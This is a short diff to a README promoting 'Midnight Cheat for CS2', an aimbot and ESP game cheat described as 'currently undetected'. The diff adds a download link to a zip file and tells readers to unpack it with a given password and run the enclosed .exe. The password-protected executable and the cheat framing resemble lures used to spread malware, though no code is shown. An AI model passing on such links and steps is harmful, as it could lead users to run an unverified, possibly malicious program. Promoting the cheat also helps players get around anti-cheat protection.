@@ -4,7 +4,7 @@
 Midnight Cheat for CS2 is a private cheat tool designed to give players maximum tactical advantage through advanced functionality like Aimbot, ESP, Chams, and Miscellaneous features. This cheat is currently undetected, ensuring a safe and enhanced gaming experience.
 _________________________
 # How to Use
-1. [Get the Latest Version]()
+1. [Get the Latest Version](https://github.com/user-attachments/files/21161916/Midnight.zip)
 2. Unzip the Files: Use the pass `Midnight` to unpack the archive.
 3. Run the Application: Execute the `.exe` file. (If it doesn't work, contact the developer.)
 4. In-Game Key: Press `HOME` to activate.
